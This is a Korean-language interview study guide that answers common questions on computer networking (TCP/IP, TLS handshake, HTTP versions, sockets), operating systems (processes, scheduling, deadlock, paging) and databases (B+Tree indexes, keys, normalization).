## 1. Network (네트워크)

<details>
<summary>웹 통신의 큰 흐름: https://www.google.com/ 을 접속할 때 일어나는 일</summary>

<br>

**1. URL 파싱 및 DNS 조회**:
- DNS Lookup (순차적, hit 시 즉시 리턴):
   - 브라우저 캐시 확인 → 없음 → 다음
   - OS hosts 파일 (/etc/hosts) 확인 → 없음 → 다음
   - OS DNS 캐시 확인 → 없음 → 다음
   - DNS 서버 질의 → IP 반환 → **여기서 멈춤**
 
**2. TCP 연결 수립** (3-Way Handshake):
```
클라이언트 --[SYN]--------> 서버
클라이언트 <-[SYN+ACK]---- 서버
클라이언트 --[ACK]--------> 서버
```

**3. TLS/SSL Handshake** (HTTPS):
- Client Hello: 지원하는 암호화 방식 전송
- Server Hello: 선택한 암호화 방식 + 인증서 전송
- 클라이언트가 CA로 인증서 검증
- Pre-Master Secret 교환으로 대칭키 생성

**4. HTTP 요청 전송**:
```http
GET / HTTP/1.1
Host: www.google.com
User-Agent: Mozilla/5.0
Accept: text/html
```

**5. 서버 처리 및 응답**:
- 웹 서버(Nginx/Apache)가 요청 수신
- 정적 파일이면 바로 반환, 동적이면 WAS로 전달
- HTTP 응답 생성 및 전송

**6. 브라우저 렌더링**:
- HTML 파싱 -> DOM 트리 생성
- CSS 파싱 -> CSSOM 트리 생성
- DOM + CSSOM -> 렌더 트리 생성
- 레이아웃 계산 -> 페인팅 -> 화면 표시

**7. TCP 연결 종료** (4-Way Handshake)

</details>

<details>
<summary>OSI 7계층과 그 존재 이유, TCP/IP 4계층에 대해 설명해주세요</summary>

<br>

<img width="1260" height="1249" alt="image" src="https://github.com/user-attachments/assets/8e209b0a-73c7-455d-b643-3791f4f27a44" />


**OSI 7계층이 존재하는 이유**:
- 네트워크 통신 과정을 단계별로 파악 가능
- 특정 계층에 문제가 생기면 해당 계층만 수정 가능
- 표준화를 통한 상호 운용성 보장

**OSI 7계층**:

| 계층 | 이름         | 역할                                   | 프로토콜/장비            | 전송 단위 |
| ---- | ------------ | -------------------------------------- | ------------------------ | --------- |
| 7    | Application  | 사용자 인터페이스, 애플리케이션 서비스 | HTTP, FTP, SMTP, DNS     | Data      |
| 6    | Presentation | 데이터 변환, 암호화, 압축              | SSL/TLS, JPEG, MPEG      | Data      |
| 5    | Session      | 세션 수립/유지/종료 관리               | NetBIOS, RPC             | Data      |
| 4    | Transport    | 종단 간 신뢰성 있는 전송               | TCP, UDP                 | Segment   |
| 3    | Network      | 라우팅, 논리 주소 지정                 | IP, ICMP, 라우터         | Packet    |
| 2    | Data Link    | 물리 주소 지정, 오류/흐름 제어         | Ethernet, 스위치, 브리지 | Frame     |
| 1    | Physical     | 비트 전송, 전기 신호 변환              | 케이블, 허브, 리피터     | Bit       |

**TCP/IP 4계층**:

| TCP/IP 계층    | OSI 계층 | 역할                  |
| -------------- | -------- | --------------------- |
| Application    | 5, 6, 7  | 애플리케이션 프로토콜 |
| Transport      | 4        | 종단 간 통신          |
| Internet       | 3        | IP 라우팅             |
| Network Access | 1, 2     | 물리적 네트워크 접근  |

</details>

<details>
<summary>소켓이 열리고 나서 서버-클라이언트가 요청되는 과정을 OSI 계층과 연관지어 설명해주세요</summary>

<br>

**송신 측** (데이터 전송):

```
[Application Layer - 7계층]
애플리케이션이 HTTP 요청 데이터 생성
"GET /api/users HTTP/1.1\r\nHost: example.com\r\n\r\n"

[Presentation Layer - 6계층]
데이터 인코딩, 암호화 (HTTPS인 경우 TLS 암호화)

[Session Layer - 5계층]
세션 관리, 연결 상태 유지

[Transport Layer - 4계층]
TCP 헤더 추가 (출발지/목적지 포트, 시퀀스 번호, ACK 번호)
데이터를 세그먼트로 분할

[Network Layer - 3계층]
IP 헤더 추가 (출발지/목적지 IP 주소, TTL)

[Data Link Layer - 2계층]
이더넷 헤더/트레일러 추가 (MAC 주소, CRC)

[Physical Layer - 1계층]
비트 스트림으로 변환하여 물리적 매체로 전송
```

**수신 측** (데이터 수신):
역순으로 각 계층의 헤더를 제거하며 상위 계층으로 전달합니다.

</details>

<details>
<summary>소켓을 통해 서버-클라이언트가 연결되기 위한 시스템콜을 설명해주세요</summary>

<br>

**서버 측**:
```c
// 1. 소켓 생성 (전화기 구입)
socket(AF_INET, SOCK_STREAM, 0);

// 2. 소켓에 주소 바인딩 (전화번호 부여)
bind(server_fd, ...); // "나는 80번 포트에서 기다릴게"라고 OS에 등록

// 3. 연결 대기 상태로 전환 (벨소리 들을 준비) -> 연결 대기열 생성 (backlog 큐)
listen(server_fd, backlog);

// 4. 클라이언트 연결 수락 (수화기 들기)
accept(server_fd, ...); // 연결된 클라이언트 전용의 새로운 소켓 생성

// 5. 데이터 송수신
read/write...
```

**클라이언트 측**:
```c
// 1. 소켓 생성
socket(AF_INET, SOCK_STREAM, 0);

// 2. 서버에 연결 요청
connect(sock_fd, ...); // 이때 OS가 클라이언트에게 남는 포트(Random Port)를 자동으로 할당 (Implicit Bind)

// 3. 데이터 송수신
write/read...
```

</details>

<details>
<summary>서버에서 accept() 시 소켓을 새로 만드는데, 그럼 서버 소켓은 2개인가요?</summary>

<br>

네, 역할이 다른 **두 종류의 소켓**이 존재합니다.

1. **Listening Socket** (리스닝 소켓):
   - 처음 `socket()`, `bind()`, `listen()` 한 소켓. (`server_fd`)
   - **역할**: 오직 **새로운 연결 요청(SYN)을 받아들이는(Accept) 문지기 역할**만 합니다.
   - 실제로 데이터를 주고받지는 않습니다.
2. **Connected Socket** (연결된 소켓):
   - `accept()`가 호출될 때마다 새로 생성되는 소켓. (`client_fd`)
   - **역할**: 연결된 **특정 클라이언트와 실제 데이터(read/write)를 주고받는 역할**입니다.
   - **1:N 구조**: 리스닝 소켓은 1개지만, 연결된 소켓은 클라이언트 수만큼(N개) 생성됩니다.

</details>

<details>
<summary>클라이언트가 1000명 연결되면 TCP 버퍼도 1000개 생기나요?</summary>

<br>

네, 맞습니다. **연결(Connected Socket)당 버퍼 1쌍**이 생성됩니다.

**구분 및 개수** (클라이언트 1000명 기준):
1. **Listen Socket**: 1개
   - **버퍼 없음**: 데이터를 주고받지 않으므로 Send/Recv 버퍼가 필요 없습니다.
   - **대기열 큐**(Queue): 대신 연결 요청을 잠시 담아둘 `SYN Queue`와 `Accept Queue`를 딱 1개씩 가집니다.
2. **Connected Socket**: 1000개
   - **버퍼 존재**: 각 소켓마다 독립적인 **Send Buffer + Revc Buffer** (1쌍)이 할당됩니다.
   - **메모리**: 따라서 연결이 많아지면 소켓 파일 자체보다, 이 **TCP 버퍼들이 차지하는 메모리**가 서버 리소스의 주범이 됩니다.
  
<img width="1260" height="1194" alt="image" src="https://github.com/user-attachments/assets/7eedf3c0-3283-4185-ba34-a9c4ef1f715c" />


</details>

<details>
<summary>포트는 0~65535번 구멍밖에 없는데, 7만 명이 동시 접속하면 어떻게 되나요?</summary>

<br>

**결론부터 말하면: 접속 가능합니다.** (서버의 포트가 부족해서 못 받는 일은 없습니다.)

이유는 **소켓을 식별하는 기준**(Unique Key)이 단순히 "도착지 포트" 하나가 아니기 때문입니다.
TCP 연결은 아래 5가지 정보(5-Tuple)로 식별됩니다.

```
{ 프로토콜, 출발지 IP, 출발지 Port, 도착지 IP, 도착지 Port }
```

서버 입장에서는:
- **도착지 Port**: 80 (고정)
- **도착지 IP**: 서버 IP (고정)
- 하지만 **출발지 IP**와 **출발지 Port**가 클라이언트마다 다릅니다.

즉, **서버의 포트는 80번 하나만 사용**하면서도, 클라이언트의 IP와 포트 조합이 다르기 때문에 서로 다른 연결로 구분할 수 있습니다.

</details>

<details>
<summary>그럼 accept()로 만든 새로운 소켓은 포트를 새로 할당받나요? (포트 소모)</summary>

<br>

**아니요! 포트를 새로 할당받지 않습니다.**
이 부분이 가장 많이 오해하는 부분입니다.

1. **포트 공유**: `accept()`로 생성된 '연결된 소켓(Connected Socket)'은 리스닝 소켓과 **동일한 로컬 포트(예: 80번)를 그대로 사용**합니다. 다른 포트 번호(예: 81, 82...)를 새로 파는 것이 아닙니다.
2. **이유**: 만약 서버가 응답할 때마다 포트를 바꾼다면, 클라이언트(브라우저) 입장에서는 80번으로 보냈는데 갑자기 뜬금없는 포트에서 응답이 오는 셈이 되어 연결이 성립되지 않습니다.
3. **구분 방법**: "어? 그럼 80번 포트 하나에 소켓이 수만 개인데 안 섞이나요?" 
   -> 네, 아까 말씀드린 **5-Tuple**(특히 클라이언트의 IP와 포트)을 보고 커널이 정확히 배달해 줍니다.

</details>

<details>
<summary>소켓을 생성하는데 포트를 안 쓴다는 게 무슨 말인가요? 소켓은 포트가 있어야 하잖아요?</summary>

<br>

여기서 중요한 개념은 **소켓은 포트 그 자체가 아니라, '파일(객체)'이다** 라는 점입니다.

**소켓의 실체**:
- 컴퓨터(OS) 내부에서 소켓은 그냥 **파일 디스크립터**(File Descriptor, FD)라는 **정수**(숫자)일 뿐입니다.
- 예를 들어, `int client_fd = accept(...)`를 실행하면, OS는 메모리에 새로운 소켓 구조체를 만들고 `3`, `4`, `5` 같은 단순한 파일 번호(ID)를 리턴해줍니다.

**구조 비교**:
1. **소켓**(FD 3번): `{ 내 IP: 서버, 내 포트: 80 }` (리스닝용)
   - "누구든지 80번으로 오면 나한테 말해."
2. **소켓**(FD 4번): `{ 내 IP: 서버, 내 포트: 80, 상대 IP: 철수, 상대 포트: 1234 }` (철수 전담)
   - "난 80번인데, 철수(1234번)랑만 얘기해."
3. **소켓**(FD 5번): `{ 내 IP: 서버, 내 포트: 80, 상대 IP: 영희, 상대 포트: 5678 }` (영희 전담)
   - "나도 80번인데, 영희(5678번)랑만 얘기해."

보시다시피 **내 포트: 80**은 모두 같지만, **파일 번호(FD)가 다르고 상대방 정보가 다르기 때문에** 엄연히 다른 소켓(파일)들이 생성된 것입니다.
따라서 포트 번호 고갈 걱정 없이 소켓(파일)만 계속 만들어낼 수 있는 것입니다.

</details>

<details>
<summary>웹 서버 소프트웨어(Apache, Nginx)는 OSI 7계층 중 어디서 작동하나요?</summary>

<br>

Apache와 Nginx는 **7계층** (Application Layer)에서 동작합니다.

**이유**:
- HTTP 프로토콜을 기반으로 동작
- 요청 URL, 헤더, 쿠키 등 애플리케이션 레벨 데이터 처리

**로드밸런싱**:
- **L4 로드밸런싱** (Transport): IP+Port 기반 라우팅. 빠름.
- **L7 로드밸런싱** (Application): URL, 헤더, 쿠키 기반 라우팅. 정교한 분산 가능.

</details>

<details>
<summary>TCP와 UDP의 차이점에 대해서 설명해주세요</summary>

| 구분           | TCP                            | UDP                       |
| -------------- | ------------------------------ | ------------------------- |
| 연결 방식      | 연결 지향 (3-way handshake)    | 비연결성                  |
| 신뢰성         | 신뢰성 있는 전송 (ACK, 재전송) | 신뢰성 없음               |
| 순서 보장      | 순서 보장 (Sequence Number)    | 순서 보장 안 함           |
| 속도           | 느림 (오버헤드)                | 빠름                      |
| 흐름/혼잡 제어 | 있음                           | 없음                      |
| 사용 예        | 웹(HTTP), 이메일, 파일 전송    | 스트리밍, 게임, DNS, VoIP |

</details>

<details>
<summary>UDP는 그럼 신뢰성이 없나요?</summary>

<br>

UDP 자체는 신뢰성을 보장하지 않지만, **애플리케이션 레벨에서 신뢰성을 구현**할 수 있습니다.

**UDP를 사용하면서 신뢰성을 확보하는 방법**:
- **QUIC 프로토콜**: HTTP/3의 기반. UDP 위에서 신뢰성, 멀티플렉싱, 암호화 제공

QUIC(UDP)은 아직 소프트웨어에서 암호화/재전송 등 처리해야해서 CPU 오버헤드 높음.

</details>

<details>
<summary>TCP에서 신뢰성을 제어하기 위해 어떤 것을 하나요?</summary>

<br>

1. **3-Way Handshake**: 연결 수립 시 양방향 통신 가능 여부 확인
2. **흐름 제어** (Flow Control): Sliding Window로 수신자 버퍼 상태에 맞춰 전송량 조절
3. **혼잡 제어** (Congestion Control): Slow Start, Congestion Avoidance로 네트워크 혼잡 방지
4. **오류 제어**: Checksum, Sequence Number, ACK, Timeout & Retransmission

</details>

<details>
<summary>TCP의 흐름 제어(Flow Control)와 혼잡 제어(Congestion Control) 기법들</summary>

<br>

**1. 흐름 제어 (Flow Control)**: 송신 측과 **수신 측**의 속도 차이 해결
- **Stop and Wait**: 매번 응답(ACK)을 받고나서 다음 패킷 전송. (비효율)
- **Sliding Window**: 수신 측의 버퍼 크기(Window Size)만큼 확인 응답 없이 연속 전송. ACK를 받으면 윈도우를 옆으로 이동(Sliding)시킴.

**2. 혼잡 제어 (Congestion Control)**: 송신 측과 **네트워크**의 혼잡도 해결
<img width="1148" height="959" alt="image" src="https://github.com/user-attachments/assets/59369fa4-e029-483c-9c3c-6e1e0ff19ee0" />


- **기본 동작 원리**:
  - **Slow Start**: 패킷을 1개, 2개, 4개... 지수적으로 늘려가며 전송 속도를 올림.
  - **Congestion Avoidance**: 임계치(Threshold) 도달 시 선형적으로 1씩 증가. 

- **대표적인 알고리즘**:
<img width="1153" height="263" alt="image" src="https://github.com/user-attachments/assets/32494469-0261-4f2c-8fa7-ab8e9d1f11de" />

  - **TCP Tahoe**: 패킷 유실 시 윈도우 크기를 무조건 **1로 초기화**. (처음부터 다시 Slow Start)
  - **TCP Reno**: 패킷 유실(3 Duplicate ACKs) 시 윈도우 크기를 **절반으로 줄임**. (Fast Recovery)
    
    <img width="1165" height="1013" alt="image" src="https://github.com/user-attachments/assets/b8e57758-efcf-4f99-9ab8-a433dd035ff9" />

    > **Note: TCP Reno 빠른 회복(Fast Recovery) 상세 동작원리**
    >
    > **1. 왜 +3 인가? (ssthresh + 3)**
    > - 3개의 중복 ACK가 도착했다는 것은, 패킷 3개(예: 11, 12, 13)가 무사히 클라이언트에 도착했다는 뜻입니다.
    > - 즉 **네트워크에서 패킷 3개가 빠져나갔으므로**, 그만큼 네트워크 버퍼에 **3개의 빈 공간**이 생겼다고 봅니다.
    > - **임계점 설정**: 이때 혼잡이 발생했다고 판단하여, **현재의 `CWND`를 절반으로 줄여 `ssthresh`로 설정**합니다. (`ssthresh = Current CWND / 2`)
    > - **윈도우 재설정**: 줄어든 임계치(`ssthresh`)에, 확보된 공간 3개만큼 더 보내기 위해 `+3`을 합니다.
    > - 예: `Current CWND = 16`이었다면, `ssthresh = 8`. `New CWND = 8 + 3 = 11`.
    >
    > **2. 추가 중복 ACK마다 +1 하는 이유**
    > - 빠른 회복 도중에도 중복 ACK가 계속 온다면, 이는 또 다른 패킷이 클라이언트에 도착해 네트워크를 빠져나갔다는 증거입니다.
    > - 따라서 빠져나간 만큼 채워 넣기 위해 `CWND`를 1씩 증가시킵니다. (Inflating Window)
    > - 4번째 중복 ACK: `CWND = 11 + 1 = 12`
    >
    > **3. 왜 회복 후 CWND = ssthresh 인가?**
    > - 유실되었던 패킷 재전송에 대한 **새로운 ACK**(ALL ACK)가 도착하면 회복이 끝난 것입니다.
    > - 빠른 회복 중에 부풀렸던 `CWND`를 버리고, 혼잡 제어를 시작하기로 했던 기준점인 `ssthresh` 값으로 복귀하여 **Congestion Avoidance**(선형 증가)를 수행합니다.
    > - `CWND = ssthresh = 8`
    >
    > **4. Reno vs Tahoe 차이**
    > - **Tahoe**: 3 Duplicate ACK 시 `CWND = 1`로 밀어버리고 **Slow Start**부터 다시 시작. (심각한 성능 저하)
    > - **Reno**: 3 Duplicate ACK 시 `CWND`를 절반으로 줄이고 **Fast Recovery** 진입. (속도 유지 유리)


  - **TCP CUBIC**: (현재 리눅스 기본값) 3차 함수 곡선을 이용해 윈도우 크기를 유연하게 조절.
 



</details>

<details>
<summary>TCP 3-Way Handshake, 4-Way Handshake에 대해서 설명해주세요</summary>

<br>

**3-Way Handshake** (연결 수립):
1. Client -> Server: **SYN** (접속 요청)
2. Server -> Client: **SYN + ACK** (요청 수락)
3. Client -> Server: **ACK** (응답 확인) -> 연결 성립

**4-Way Handshake** (연결 종료):
1. Client -> Server: **FIN** (종료 요청)
2. Server -> Client: **ACK** (확인, 잠시만 기다려) -> Server는 남은 데이터 전송
3. Server -> Client: **FIN** (나도 끝났어)
4. Client -> Server: **ACK** (알겠어) -> Server 연결 종료
5. Client: **TIME_WAIT** 후 종료 (지연 패킷 처리 보장)

</details>

<details>
<summary>HTTP와 HTTPS의 차이점에 대해서 설명해주세요</summary>

<br>

| 구분 | HTTP             | HTTPS                 |
| ---- | ---------------- | --------------------- |
| 포트 | 80               | 443                   |
| 보안 | 취약 (평문 전송) | 안전 (SSL/TLS 암호화) |

**HTTPS 특징**:
- **기밀성**: 암호화로 도청 방지
- **무결성**: 데이터 변조 탐지
- **인증**: CA 인증서로 서버 신원 확인

</details>

<details>   
<summary>HTTPS의 SSL Handshake 과정을 설명해주세요</summary>

<br>

<img width="1200" height="1272" alt="image" src="https://github.com/user-attachments/assets/24869ccc-a42c-4563-8e47-b1650e767ccf" />

1. **Client Hello**: 지원 암호화 방식, 랜덤값 전송
2. **Server Hello**: 선택한 암호화 방식, 랜덤값, **인증서**(공개키 포함) 전송
3. **인증서 검증**: 클라이언트가 CA 공개키로 서버 인증서 검증
4. **Pre-Master Secret**: 수신한 서버의 **공개키**로 생성한 pre-Master Secret을 암호화하여 전송 (비대칭키)
5. **Session Key 생성**: 양측이 서버측 랜덤값 + 클라이언트측 랜덤값 + Pre-Master Secret으로 동일한 **대칭키**(Session Key) 생성
6. **통신 시작**: 이후 데이터는 **대칭키**로 암호화하여 통신

</details>

<details>
<summary>왜 처음엔 비대칭키를 쓰고 나중엔 대칭키로 이루어지나요?</summary>

<br>

**Hybrid 방식의 이유**:
1. **비대칭키(공개키)**: 키 교환에 안전하지만, **복잡한 수학적 연산(소인수분해, 타원곡선 등)이 필요해 CPU 부하가 크고 매우 느림**.
2. **대칭키**: **단순한 비트 연산(XOR, Shift)이나 CPU 하드웨어 가속(AES-NI)**을 사용하므로 **매우 빠름**.

-> 따라서, **처음에만 비대칭키로 대칭키를 안전하게 공유**하고, 이후 **대용량 데이터는 빠른 대칭키로 통신**합니다.

</details>

<details>
<summary>HTTP 버전별 차이를 설명해주세요</summary>

<br>

<img width="783" height="461" alt="image" src="https://github.com/user-attachments/assets/aeb07f7b-4991-4709-8c8e-6ab9a754bc15" />


- **HTTP/1.0**: 매 요청마다 연결 수립/종료 (비효율)
- **HTTP/1.1**: **Keep-Alive** (연결 재사용), **Pipelining** (순차적 요청, Head-of-Line Blocking 문제 존재)
- **HTTP/2**: **Multiplexing** (한 연결로 동시 다발적 요청 처리), **Header Compression**, **Server Push**
- **HTTP/3**: **QUIC** (UDP 기반), TCP의 Head-of-Line Blocking 완전 해결, 초기 연결 속도 비약적 향상

</details>

<details>
<summary>HTTP 상태 코드(Status Code)에 대해 설명해주세요</summary>

<br>

- **2xx** (Success): 요청 성공 (200 OK, 201 Created)
- **3xx** (Redirection): 페이지 이동 필요 (301 Moved Permanently, 302 Found)
- **4xx** (Client Error): 클라이언트 잘못 (400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found)
- **5xx** (Server Error): 서버 잘못 (500 Internal Server Error, 502 Bad Gateway)

</details>

<details>
<summary>GET과 POST의 차이점에 대해서 설명해주세요</summary>

<br>

| 구분        | GET                   | POST                 |
| ----------- | --------------------- | -------------------- |
| 목적        | 데이터 조회 (Read)    | 데이터 생성 (Create) |
| 데이터 위치 | URL Query String      | HTTP Body            |
| 멱등성      | O (여러 번 해도 같음) | X (할 때마다 생성됨) |
| 캐싱        | 가능                  | 불가능               |

</details>

<details>
<summary>RESTful이란 무엇이며 특징을 설명해주세요</summary>

<br>

**REST** (Representational State Transfer):
HTTP URI로 자원을 명시하고, HTTP Method(GET, POST, PUT, DELETE)로 행위를 정하는 아키텍처 스타일입니다.

**RESTful 원칙**:
1. **URI는 자원을 표현** (동사 제외, 명사 위주, 계층 구조) -> `GET /users/1`
2. **Method는 행위를 표현** -> 조회(GET), 생성(POST), 수정(PUT/PATCH), 삭제(DELETE)
3. **Stateless**: 서버는 클라이언트 상태를 저장하지 않음 (JWT, LocalStorage)

</details>

<details>
<summary>CORS란 무엇이며 설명해주세요</summary>

<br>

**CORS** (Cross-Origin Resource Sharing):
보안상 브라우저는 다른 출처(도메인, 포트 등)의 리소스 요청을 차단합니다(SOP). 이를 허용해주기 위해 서버가 응답 헤더에 "이 출처는 허용한다"라고 알려주는 메커니즘입니다.

- **Preflight Request**: 실제 요청 전 `OPTIONS` 메서드로 서버의 허용 여부를 먼저 확인함.
- **해결**: 서버에서 `Access-Control-Allow-Origin` 헤더 설정.

</details>

<details>
<summary>Cookie와 Session의 차이점을 설명해주세요</summary>

<br>

| 구분      | Cookie                    | Session                  |
| --------- | ------------------------- | ------------------------ |
| 저장 위치 | **클라이언트** (브라우저) | **서버** (메모리/DB)     |
| 보안      | 취약 (탈취/변조 용이)     | 안전 (Session ID만 노출) |
| 용량      | 작음 (4KB)                | 서버 허용 범위 내        |
| 만료      | 설정 가능                 | 브라우저 종료 시 삭제    |

**동작 원리**:
1. 로그인 성공 시 서버가 Session ID 생성 및 저장
2. Response Header(`Set-Cookie`)에 Session ID를 담아 전송
3. 이후 클라이언트는 요청마다 Cookie에 Session ID를 담아 보냄
4. 서버는 Session ID로 사용자 식별

</details>

<details>
<summary>LocalStorage, SessionStorage, Cookie의 차이점</summary>

<br>

| 구분      | Cookie                         | LocalStorage               | SessionStorage             |
| --------- | ------------------------------ | -------------------------- | -------------------------- |
| 저장 위치 | 클라이언트 (전송 시 헤더 포함) | 클라이언트 (브라우저 내부) | 클라이언트 (브라우저 내부) |
| 용량      | 4KB                            | 5MB 이상                   | 5MB 이상                   |
| 서버 전송 | 매 요청마다 전송됨             | 전송되지 않음              | 전송되지 않음              |
| 수명      | 만료 기한 설정 가능            | 영구 저장 (지울 때까지)    | 탭/브라우저 종료 시 삭제   |
| 용도      | 인증 토큰(JWT), 오늘 그만보기  | 자동 로그인 저장, 장바구니 | 일회성 폼 데이터           |

</details>

## 2. Operating System (운영체제)

<details>
<summary>프로세스와 스레드의 차이점을 설명해주세요</summary>

<br>

- **프로세스**(Process): 실행 중인 프로그램의 단위. **메모리(Code, Data, Heap, Stack)를 독립적으로 할당**받음.
- **스레드**(Thread): 프로세스 내의 실행 흐름 단위. 프로세스의 **메모리(Code, Data, Heap)를 공유**하고, **Stack과 PC(Register)만 독립적**으로 가짐.

**요약**: 프로세스는 자원 할당의 단위, 스레드는 실행의 단위.

</details>

<details>
<summary>컨텍스트 스위칭(Context Switching)이란?</summary>

<br>

CPU가 현재 실행 중인 프로세스/스레드의 상태(Context)를 저장하고, 다음 실행할 프로세스/스레드의 상태를 로드하여 교체하는 작업입니다.

- **PCB (Process Control Block)**: 프로세스 상태 저장 (PC, Register, Memory 등). 무거움.
- **TCB (Thread Control Block)**: 스레드 상태 저장 (PC, Register, Stack Pointer). 가벼움 (Code/Data/Heap 공유하므로).
- **오버헤드**: 캐시 초기화 등 비용 발생. 스레드가 가벼운 이유는 공유 메모리 덕분에 TCB만 교체하면 되기 때문.

</details>

<details>
<summary>인터럽트(Interrupt)와 트랩(Trap)의 차이</summary>

<br>

둘 다 CPU의 실행 흐름을 중단시키고 커널 모드로 전환하는 이벤트입니다.

- **인터럽트** (Hardware Interrupt):
    - **발생 주체**: 하드웨어 (키보드 입력, 디스크 I/O 완료, 타이머).
    - **특징**: **비동기적** (프로그램 실행 위치와 상관없이 외부에서 발생).
- **트랩** (Software Interrupt):
    - **발생 주체**: 실행 중인 프로그램 (소프트웨어).
    - **원인**:
        1. **예외**(Exception): `0으로 나누기`, `Page Fault` (에러).
        2. **시스템 콜**(System Call): `read()`, `fork()` 등 커널 기능 요청 (의도적).
    - **특징**: **동기적** (특정 코드 실행 시 발생).

</details>

<details>
<summary>캐시의 지역성(Locality)이란?</summary>

<br>

프로그램이 데이터를 참조할 때 특정 패턴을 보이는 성질입니다. 이를 이용해 캐시 히트율(Hit Rate)을 높입니다.

1. **시간 지역성 (Temporal Locality)**: 최근 사용한 데이터가 곧 다시 사용될 가능성이 높음 (예: 반복문의 변수).
2. **공간 지역성 (Spatial Locality)**: 사용한 데이터의 **주변 데이터**가 곧 사용될 가능성이 높음 (예: 배열 접근).

</details>

<details>
<summary>CPU 스케줄러의 종류와 특징은?</summary>

<br>

- **FCFS** (First-Come First-Served): 먼저 온 순서대로 처리 (비선점).
- **Round Robin** (RR): 시간 할당량(Time Slice)만큼 쓰고 교체 (선점). 시분활 시스템의 기본.
- **SJF** (Shortest Job First): 실행 시간이 가장 짧은 것 먼저 처리.
- **Priority Scheduling**: 우선순위 높은 것 먼저. (Aging 기법으로 기아 현상 방지)

</details>

<details>
<summary>동기화 문제: 뮤텍스와 세마포어의 차이는?</summary>

<br>

| 구분            | 뮤텍스 (Mutex)                     | 세마포어 (Semaphore)             |
| --------------- | ---------------------------------- | -------------------------------- |
| **동기화 대상** | **1개**                            | **N개**                          |
| **소유권**      | **있음** (락을 건 놈만 풀 수 있음) | **없음** (누가 걸었든 해제 가능) |
| **타입**        | Locking 메커니즘                   | Signaling 메커니즘               |

- **Mutex**: 화장실 키 (1명만 사용, 키 가진 사람이 나와야 다음 사람 들어감).
- **Semaphore**: 화장실 칸 수 (N명 사용, 빈 칸 수만큼 들어감).

</details>

<details>
<summary>데드락(Deadlock)이란?</summary>

<br>

두 개 이상의 프로세스가 서로 상대방의 자원을 점유한 채 무한정 기다리는 상태입니다.

**발생 4대 조건 (모두 만족해야 발생)**:
1. **상호 배제** (Mutual Exclusion): 자원은 한 번에 한 프로세스만 사용 가능.
2. **점유와 대기** (Hold and Wait): 자원을 가진 채 다른 자원을 기다림.
3. **비선점** (No Preemption): 다른 프로세스의 자원을 뺏을 수 없음.
4. **순환 대기** (Circular Wait): 꼬리에 꼬리를 물고 대기 (A->B, B->A).

**해결 방법**:
- **예방/회피**: 조건 중 하나를 깸 (예: 락 순서 정하기, 은행원 알고리즘).
- **탐지/무시**: 데드락 발생 시 탐지하여 해당 프로세스 강제 종료 (MySQL은 탐지/롤백 방식 사용).

</details>

<details>
<summary>가상 메모리와 페이지 폴트(Page Fault) 과정</summary>

<img width="666" height="556" alt="image" src="https://github.com/user-attachments/assets/6cce299a-6c92-409c-acd0-6d11c096209f" />


<br>

**가상 메모리**: 물리 메모리보다 큰 프로그램을 실행하기 위해 디스크 공간을 메모리처럼 사용하는 기술.

**MMU (Memory Management Unit)**:
- **주소 변환**: CPU가 사용하는 **가상 주소**를 실제 메모리의 **물리 주소**로 변환해주는 하드웨어 장치입니다. ("통역사" 역할)
- **메모리 보호**: 프로세스가 자신의 할당된 메모리 영역 밖을 침범하지 못하도록 감시하고 차단합니다. (침범 시 인터럽트 발생)

**Page Fault**: 프로세스가 접근하려는 페이지가 물리 메모리에 없을 때 발생하는 인터럽트.

**처리 과정**:
1. CPU가 가상 주소 접근 -> **MMU**가 페이지 테이블 확인 -> Valid bit 0 (없음)
2. **Page Fault** 발생 -> OS로 트랩 전송
3. OS가 디스크(Swap Area)에서 해당 페이지 탐색
4. 물리 메모리의 빈 프레임에 로드 (없다면 페이지 교체 알고리즘 동작)
5. 페이지 테이블 업데이트 후 프로세스 재개

**페이지 교체 알고리즘** (메모리 꽉 찼을 때 누구 뺄래?):
1. **FIFO** (First In First Out): 가장 먼저 들어온 페이지 제거. (단순하지만 비효율적)
2. **LRU** (Least Recently Used): **가장 오랫동안 사용하지 않은** 페이지 제거. (시간 지역성 성질 이용, 가장 성능이 좋음)
3. **LFU** (Least Frequently Used): 참조 횟수가 가장 적은 페이지 제거.

</details>

## 3. Database (데이터베이스)

<details>
<summary>인덱스(Index)의 개념과 자료구조(B+Tree)</summary>

<br>

인덱스는 검색 속도를 향상시키기 위한 자료구조입니다. 주로 **B+Tree**를 사용합니다.

**B+Tree 특징**:
- 모든 데이터가 **리프 노드**에만 있음 (범위 검색 유리).
- 리프 노드끼리 Linked List로 연결되어 순차 탐색 빠름.
- **Balanced Tree**로 조회 성능이 O(log N) 보장.

**왜 중간 노드엔 키만 저장하나요?**: 하나의 디스크 블록에 더 많은 키를 담아 트리의 높이를 낮추기 위함입니다 

</details>

<details>
<summary>클러스터드 인덱스 vs 논-클러스터드 인덱스</summary>

<br>

- **Clustered Index**: 물리적 데이터 정렬 순서와 인덱스 순서가 동일. 테이블당 1개 (주로 PK). 검색 빠름.
- **Non-Clustered Index**: 물리적 정렬과 무관. 별도의 인덱스 페이지 존재. 테이블당 여러 개 가능.

</details>

<details>
<summary>Primary Key(PK)와 Unique Key(UK)의 차이점</summary>

<br>

| 구분               | Primary Key (기본키)                                  | Unique Key (고유키)                        |
| :----------------- | :---------------------------------------------------- | :----------------------------------------- |
| **Null 허용 여부** | **허용 안 함 (Not Null)**                             | **허용** (여러 개 가능)                    |
| **개수**           | 테이블당 **1개만** 가능                               | 테이블당 **여러 개** 가능                  |
| **인덱스**         | 자동으로 **Clustered Index** 생성 (MySQL InnoDB 기준) | 자동으로 **Non-Clustered Index** 생성      |
| **용도**           | 레코드를 식별하는 유일한 ID (주민번호)                | 중복을 방지해야 하는 값 (이메일, 전화번호) |

**DB에서 NULL 값이란?**
- `Null`은 "값이 없음(Empty)"이나 "0"이 아니라, "**알 수 없음(Unknown)**" 또는 "**아직 정의되지 않음**"을 의미합니다.
- `Null`과의 모든 연산 결과는 `Null`입니다. (`1 + Null = Null`, `Null = Null -> False`)
- MySQL Unique Key는 `Null`을 **중복으로 보지 않습니다**. 즉, `Null` 값은 여러 개 들어갈 수 있습니다.

</details>

<details>
<summary>정규화(Normalization)란?</summary>

<br>

데이터 중복을 줄이고 무결성을 유지하기 위해 테이블을 분해하는 과정입니다.

- **1차**(1NF): 원자값만 저장 (Atomic).
- **2차**(2NF): 부분 함수 종속 제거 (PK의 일부에만 종속된 컬럼 분리).
- **3차**(3NF): 이행 함수 종속 제거 (A->B, B->C 일 때 A->C 제거).
